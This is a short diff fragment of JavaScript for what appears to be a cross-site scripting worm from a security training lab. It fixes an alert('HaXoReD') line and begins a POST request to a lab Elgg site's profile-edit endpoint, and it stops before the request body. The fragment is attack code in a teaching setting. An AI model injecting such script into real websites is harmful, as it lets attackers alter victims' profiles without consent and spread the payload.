@@ -1,4 +1,4 @@
-aler('HaXoReD');
+alert('HaXoReD');
 var Ajax=null;
 Ajax=new XMLHttpRequest();
 Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
